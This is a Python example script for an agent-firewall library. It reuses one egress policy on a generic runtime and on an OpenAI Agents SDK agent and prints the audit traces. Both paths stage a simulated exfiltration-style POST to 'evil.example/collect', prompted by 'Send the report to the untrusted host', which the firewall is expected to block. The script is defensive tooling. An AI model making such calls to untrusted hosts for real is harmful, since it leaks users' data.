"""Reuse one policy pack across the generic preview and OpenAI Agents paths."""

from __future__ import annotations

import io

from _openai_agents_fake_model import build_fake_model

from agentfirewall import FirewallConfig, InMemoryAuditSink, create_firewall
from agentfirewall.audit import export_audit_trace
from agentfirewall.exceptions import FirewallViolation
from agentfirewall.generic import create_generic_runtime_bundle
from agentfirewall.openai_agents import create_agent as create_firewalled_agent
from agentfirewall.openai_agents import create_http_tool
from agentfirewall.policy_packs import named_policy_pack

try:
    from agents import Agent, Runner
    from agents.run_config import RunConfig

    OPENAI_AGENTS_AVAILABLE = True
except ImportError:
    OPENAI_AGENTS_AVAILABLE = False


def _fake_http_opener(request, **kwargs):
    return io.BytesIO(b'{"status":"ok"}')


def _print_trace(label: str, trace: list[dict[str, object]]) -> None:
    print(label)
    for item in trace:
        host = item["decision_metadata"].get("hostname", "-")
        print(
            f"  {item['event_kind']:<12} action={item['action']:<5} "
            f"rule={item['rule']:<28} host={host}"
        )


def _run_generic_preview(shared_policy) -> list[dict[str, object]]:
    memory = InMemoryAuditSink()
    bundle = create_generic_runtime_bundle(
        config=FirewallConfig(name="shared-policy-generic"),
        policy_pack=shared_policy,
        audit_sink=memory,
        http_opener=_fake_http_opener,
        tool_call_id_factory=lambda name, args, kwargs: f"call_policy_reuse_{name}",
    )
    bundle.register_tool(
        "http_request",
        lambda url, method="GET": bundle.http_client.request(url, method=method).read(),
    )

    try:
        bundle.dispatch(
            "http_request",
            url="https://evil.example/collect",
            method="POST",
        )
    except FirewallViolation:
        pass

    return export_audit_trace(memory.entries)


def _run_openai_agents(shared_policy) -> list[dict[str, object]]:
    if not OPENAI_AGENTS_AVAILABLE:
        raise SystemExit(
            "This example requires the OpenAI Agents SDK. "
            "Install with `pip install agentfirewall[openai-agents]`."
        )

    memory = InMemoryAuditSink()
    firewall = create_firewall(
        config=FirewallConfig(name="shared-policy-openai"),
        policy_pack=shared_policy,
        audit_sink=memory,
    )
    agent = Agent(
        name="Shared Policy Demo",
        instructions="You are a helpful assistant.",
        tools=[create_http_tool(firewall=firewall, opener=_fake_http_opener)],
        model=build_fake_model(
            tool_calls=[
                {
                    "id": "call_openai_http",
                    "name": "http_request",
                    "args": {
                        "url": "https://evil.example/collect",
                        "method": "POST",
                    },
                }
            ],
            final_text="done",
        ),
    )
    firewalled_agent = create_firewalled_agent(
        agent=agent,
        firewall=firewall,
        inspect_prompts=True,
    )

    try:
        Runner.run_sync(
            firewalled_agent,
            "Send the report to the untrusted host.",
            run_config=RunConfig(tracing_disabled=True),
        )
    except Exception:
        pass

    return export_audit_trace(memory.entries)


def main() -> None:
    shared_policy = named_policy_pack(
        "default",
        trusted_hosts=("api.openai.com",),
    )
    print("== shared policy reuse ==")
    print("policy pack: default")
    print("trusted_hosts: ('api.openai.com',)")
    print("expected behavior: untrusted egress is blocked on both runtime paths")
    print()

    _print_trace("generic preview:", _run_generic_preview(shared_policy))
    print()
    _print_trace("openai agents official path:", _run_openai_agents(shared_policy))


if __name__ == "__main__":
    main()
